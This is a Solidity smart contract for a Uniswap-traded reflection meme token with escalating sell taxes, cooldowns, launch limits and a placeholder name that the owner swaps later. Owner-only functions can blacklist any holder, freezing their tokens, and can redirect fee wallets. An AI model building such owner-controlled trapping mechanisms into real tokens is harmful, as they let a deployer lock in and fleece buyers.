// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/access/Ownable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/Context.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/utils/Address.sol";

contract ApeToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    // erc20
    mapping (address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    // total supply = 1 trillion
    uint256 private constant _tTotal = 10**12 * 10**_decimals;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    // gets changed to APE ASTAX later
    string private _name = 'ABC';
    // gets changed to ASTAX \xF0\x9F\xA6\x8D later
    string private _symbol = 'ABC';
    uint8 private constant _decimals = 9;

    // uniswap
    address public constant uniswapV2RouterAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddr);
    address public constant uniswapV2FactoryAddr = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address public liquidityPoolAddr =  UniswapV2Library.pairFor(uniswapV2FactoryAddr, uniswapV2Router.WETH(), address(this));

    // cooldown and numsells
    struct Holder {
        uint256 timeTransfer;
        uint256 numSells;
        uint256 timeSell;
    }
    mapping (address => Holder) public holder;
    // first 10 minutes there is a buy limit of 0.3% of liquidity pool
    uint256 private constant _buyLimit =  27 * 10**8 * 10**_decimals;
    // first 10 minutes there is a holding limit for each address of 1% of the liquidity pool
    uint256 private constant _holderLimit = 90 * 10**8 * 10**_decimals;
    uint256 private constant _resetTime = 24 hours;

    // taxes
    mapping (address => bool) public whitelist;
    mapping (address => bool) public blacklist;
    struct Taxes {
        uint256 marketing;
        uint256 redistribution;
        uint256 lottery;
        uint256 buybackBurn;
    }
    Taxes private _buyTaxrates = Taxes(50, 25, 25, 0);
    Taxes private _firstSellTaxrates = Taxes(50, 0, 20, 30);
    Taxes private _secondSellTaxrates = Taxes(125, 0, 50, 75);
    Taxes private _thirdSellTaxrates = Taxes(175, 0, 70, 105);
    Taxes private _fourthSellTaxrates = Taxes(225, 0, 90, 135);
    address public constant burnAddr = address(0x000000000000000000000000000000000000dEaD);
    address payable public marketingAddr = payable(0x7B7B7c8A9cd0922E5894B3d3166f313Cf200A363);
    address payable public marketingInitialAddr = payable(0xdcBBcAA8fD8e610017D6922517Ff3f4ed2611e71);
    address public lotteryAddr = address(0x284c1D4Fb47e6548bde1e63A47198419Ec678449);

    // gets set to true after openTrading is called
    bool public tradingEnabled = false;
    uint256 public launchTime;

    // preventing circular calls of swapping
    bool public inSwap = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    // every time the contract has 0.000005% of the total supply in tokens it will swap
    // them to eth in the next sell, keeping the buyback taxes whilst sending the rest to marketing
    uint256 public minimumTokensBeforeSwap = _tTotal.mul(5).div(1000000);

    // every time the contract has 1 eth it will use that for the buyback burn
    uint256 public minimumETHBeforeBurn = 1 ether;

    // the counter for how much of the token balance of the contract is allocated to buyback.
    // get reset every time the contract balance is swapped to eth.
    uint256 public rBuybackBurn;
    
    // initial token allocations
    uint256 private _ownerTokenAmount = _rTotal.div(100).mul(90);
    uint256 private _marketingInitialTokenAmount = _rTotal.div(100).mul(5);
    uint256 private _lotteryTokenAmount = _rTotal.div(100).mul(5);

    event SwapETHForTokens(uint256 amountIn, address[] path);
    event SwapTokensForETH(uint256 amountIn, address[] path);

    constructor () {
        
        // 90% of tsupply to owner
        _rOwned[_msgSender()] = _ownerTokenAmount;
        emit Transfer(address(0), _msgSender(), _ownerTokenAmount);
        // 5% of tsupply to marketingInitial
        _rOwned[marketingInitialAddr] = _marketingInitialTokenAmount;
        emit Transfer(address(0), marketingInitialAddr, _marketingInitialTokenAmount);
        // 5% of tsupply to lottery
        _rOwned[lotteryAddr] = _lotteryTokenAmount;
        emit Transfer(address(0), lotteryAddr, _lotteryTokenAmount);

        whitelist[address(this)] = true;
        whitelist[_msgSender()] = true;
        whitelist[lotteryAddr] = true;
        whitelist[marketingInitialAddr] = true;
        whitelist[marketingAddr] = true;
    }
    receive() external payable {}


// ==========  ERC20
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


// ==========  TRANSFER
    function _transfer(address sender, address recipient, uint256 tAmount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        require(tradingEnabled || whitelist[sender] || whitelist[recipient], "Trading is not live yet. ");
        require(!blacklist[sender] && !blacklist[recipient], "Address is blacklisted. ");

        Taxes memory taxRates = Taxes(0,0,0,0);

        // getting appropiate tax rates and swapping of tokens/ sending of eth when threshhold passed
        if (!whitelist[sender] && !whitelist[recipient]) {

            // buy tax
            if (sender == liquidityPoolAddr && recipient != uniswapV2RouterAddr) {

                if (launchTime.add(10 minutes) >= block.timestamp) {
                    require(
                        balanceOf(recipient).add(tAmount) <= _holderLimit,
                        "The sale is limited to 1% of LP per address for the first 10 minutes. "
                    );
                    require(
                        tAmount <= _buyLimit,
                        "No buy greater than 0.3% of LP can be made for the first 10 minutes. "
                    );
                    require(
                        holder[recipient].timeTransfer.add(45 seconds) < block.timestamp,
                        "Need to wait 45 seconds until next transfer. "
                    );
                    holder[recipient].timeTransfer = block.timestamp;
                } else {
                    require(
                        holder[sender].timeTransfer.add(30 seconds) < block.timestamp,
                        "Need to wait 30 seconds until next transfer. "
                    );
                    holder[sender].timeTransfer = block.timestamp;
                }

                // set standard buy taxrates
                taxRates = _buyTaxrates;
            }

            // sell tax
            if (recipient == liquidityPoolAddr) {

                if (launchTime.add(10 minutes) >= block.timestamp) {
                    require(
                        holder[sender].timeTransfer.add(45 seconds) < block.timestamp,
                        "Need to wait 45 seconds until next transfer. "
                    );
                    holder[sender].timeTransfer = block.timestamp;
                } else {
                    require(
                        holder[sender].timeTransfer.add(30 seconds) < block.timestamp,
                        "Need to wait 30 seconds until next transfer. "
                    );
                    holder[sender].timeTransfer = block.timestamp;
                }

                // reset number of sells after 24 hours
                if (holder[sender].numSells > 0 && holder[sender].timeSell.add(_resetTime) < block.timestamp) {
                    holder[sender].numSells = 0;
                    holder[sender].timeSell = block.timestamp;
                }

                // set tax according to price impact or number of sells
                uint256 priceImpact = tAmount.mul(100).div(balanceOf(liquidityPoolAddr));

                // default sell taxrate, gets changed if numsells or priceimpact indicates that it should
                taxRates = _firstSellTaxrates;

                if (priceImpact > 1 || holder[sender].numSells == 1) {
                    taxRates = _secondSellTaxrates;
                }
                if (priceImpact > 2 || holder[sender].numSells == 2) {
                    taxRates = _thirdSellTaxrates;
                }
                if (priceImpact > 3 || holder[sender].numSells >= 3) {
                    taxRates = _fourthSellTaxrates;
                }

                // increment number of sells for holder
                if (holder[sender].numSells < 3) {
                    holder[sender].numSells = holder[sender].numSells.add(1);
                }
            }

            // wallet 2 wallet tax (or nonuniswap)
            if (sender != liquidityPoolAddr && recipient != liquidityPoolAddr) {

                if (launchTime.add(10 minutes) >= block.timestamp) {
                    require(
                        holder[sender].timeTransfer.add(45 seconds) < block.timestamp,
                        "Need to wait 45 seconds until next transfer. "
                    );
                    holder[sender].timeTransfer = block.timestamp;
                } else {
                    require(
                        holder[sender].timeTransfer.add(30 seconds) < block.timestamp,
                        "Need to wait 30 seconds until next transfer. "
                    );
                    holder[sender].timeTransfer = block.timestamp;
                }
                // same tax rates as a third sell
                taxRates = _thirdSellTaxrates;
            }

            // if not already swapping then tokens and eth can be swapped now
            if (!inSwap && sender != liquidityPoolAddr) {

                // swap tokens and send some to marketing, whilst keeping the eth for buyback burn
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= minimumTokensBeforeSwap) {
                    if (rBuybackBurn != 0) {
                        uint256 toBeBurned = tokenFromReflection(rBuybackBurn);
                        rBuybackBurn = 0;
                        uint256 toBeSentToMarketing = contractTokenBalance.sub(toBeBurned);
                        swapTokensForETHTo(toBeSentToMarketing, marketingAddr);
                        swapTokensForETHTo(toBeBurned, payable(this));
                    } else {
                        swapTokensForETHTo(contractTokenBalance, marketingAddr);
                    }
                }

                // swap eth for buyback burn if above minimum
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= minimumETHBeforeBurn) {
                    swapETHForTokensTo(contractETHBalance, burnAddr);
                }
            }
        }

        // make sure taxes are not applied when swapping internal balances
        if(inSwap) {
            taxRates = Taxes(0,0,0,0);
        }

        // check taxrates and use simpler transfer if appropiate
        if (taxRates.marketing == 0 && taxRates.buybackBurn == 0 && taxRates.redistribution == 0 && taxRates.lottery == 0) {
            _tokenTransferWithoutFees(sender, recipient, tAmount);
        } else {
            _tokenTransferWithFees(sender, recipient, tAmount, taxRates);
        }
    }

    function _tokenTransferWithoutFees(address sender, address recipient, uint256 tAmount) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function _tokenTransferWithFees(address sender, address recipient, uint256 tAmount, Taxes memory taxRates) private {

        // translating amount to reflected amount
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);

        // getting tax values
        Taxes memory tTaxValues = _getTTaxValues(tAmount, taxRates);
        Taxes memory rTaxValues = _getRTaxValues(tTaxValues);

        // removing tax values from the total amount
        uint256 rTransferAmount = _getTransferAmount(rAmount, rTaxValues);
        uint256 tTransferAmount = _getTransferAmount(tAmount, tTaxValues);

        // reflecting sender and recipient balances
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);

        // reflecting redistribution fees
        _rTotal = _rTotal.sub(rTaxValues.redistribution);

        // reflecting lottery fees
        _rOwned[lotteryAddr] = _rOwned[lotteryAddr].add(rTaxValues.lottery);

        // reflecting buybackburn and marketing fees
        _rOwned[address(this)] = _rOwned[address(this)].add(rTaxValues.marketing).add(rTaxValues.buybackBurn);
        rBuybackBurn = rBuybackBurn.add(rTaxValues.buybackBurn);

        // standard erc20 event
        emit Transfer(sender, recipient, tTransferAmount);
    }



// ==========  SWAP
    function swapTokensForETHTo(uint256 tokenAmount, address payable recipient) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), uniswapV2RouterAddr, tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            recipient,
            block.timestamp.add(300)
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapETHForTokensTo(uint256 amount, address recipient) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            recipient,
            block.timestamp.add(300)
        );

        emit SwapETHForTokens(amount, path);
    }


// ==========  REFLECT
    function _getRate() private view returns(uint256) {
        return _rTotal.div(_tTotal);
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less or equal than total reflections");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _getTTaxValues(uint256 amount, Taxes memory taxRates) private pure returns (Taxes memory) {
        Taxes memory taxValues;
        taxValues.redistribution = amount.div(1000).mul(taxRates.redistribution);
        taxValues.buybackBurn = amount.div(1000).mul(taxRates.buybackBurn);
        taxValues.marketing = amount.div(1000).mul(taxRates.marketing);
        taxValues.lottery = amount.div(1000).mul(taxRates.lottery);
        return taxValues;
    }

    function _getRTaxValues(Taxes memory tTaxValues) private view returns (Taxes memory) {
        Taxes memory taxValues;
        uint256 currentRate = _getRate();
        taxValues.redistribution = tTaxValues.redistribution.mul(currentRate);
        taxValues.buybackBurn = tTaxValues.buybackBurn.mul(currentRate);
        taxValues.marketing = tTaxValues.marketing.mul(currentRate);
        taxValues.lottery = tTaxValues.lottery.mul(currentRate);
        return taxValues;
    }

    function _getTransferAmount(uint256 amount, Taxes memory taxValues) private pure returns (uint256) {
        return amount.sub(taxValues.marketing).sub(taxValues.lottery).sub(taxValues.buybackBurn).sub(taxValues.redistribution);
    }


// ==========  ADMIN
    function openTrading() external onlyOwner() {
        require(!tradingEnabled, "Trading is already enabled. ");
        tradingEnabled = true;
        launchTime = block.timestamp;
    }

    function manualTaxConv() external onlyOwner() returns (bool) {
        // swap tokens and send some to marketing, whilst keeping the eth for buyback burn
        uint256 contractTokenBalance = balanceOf(address(this));
        if (contractTokenBalance > 0) {
            if (rBuybackBurn != 0) {
                uint256 toBeBurned = tokenFromReflection(rBuybackBurn);
                rBuybackBurn = 0;
                uint256 toBeSentToMarketing = contractTokenBalance.sub(toBeBurned);
                swapTokensForETHTo(toBeSentToMarketing, marketingAddr);
                swapTokensForETHTo(toBeBurned, payable(this));
            } else {
                swapTokensForETHTo(contractTokenBalance, marketingAddr);
            }
        }
        return true;
    }

    function manualBuybackBurn() external onlyOwner() returns (bool) {
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            swapETHForTokensTo(contractETHBalance, burnAddr);
        }
        return true;
    }

    function setWhitelist(address addr, bool onoff) external onlyOwner() {
        whitelist[addr] = onoff;
    }
    
    function setBlacklist(address addr, bool onoff) external onlyOwner() {
        blacklist[addr] = onoff;
    }
    
    function setMarketingWallet(address payable marketing) external onlyOwner() {
        marketingAddr = marketing;
    }

    function setMarketingLottery(address lottery) external onlyOwner() {
        lotteryAddr = lottery;
    }

    function restoreNameAndSymbol() external onlyOwner() {
        _name = "APE ASTAX";
        _symbol = "ASTAX \xF0\x9F\xA6\x8D";
    }

    function setMinimumTokensBeforeSwap(uint256 val) external onlyOwner() {
        minimumTokensBeforeSwap = val;
    }

    function setMinimumETHBeforeBurn(uint256 val) external onlyOwner() {
        minimumETHBeforeBurn = val;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}


// ==========  LIBS
library UniswapV2Library {
    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            )))));
    }
}

interface IUniswapV2Router02  {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

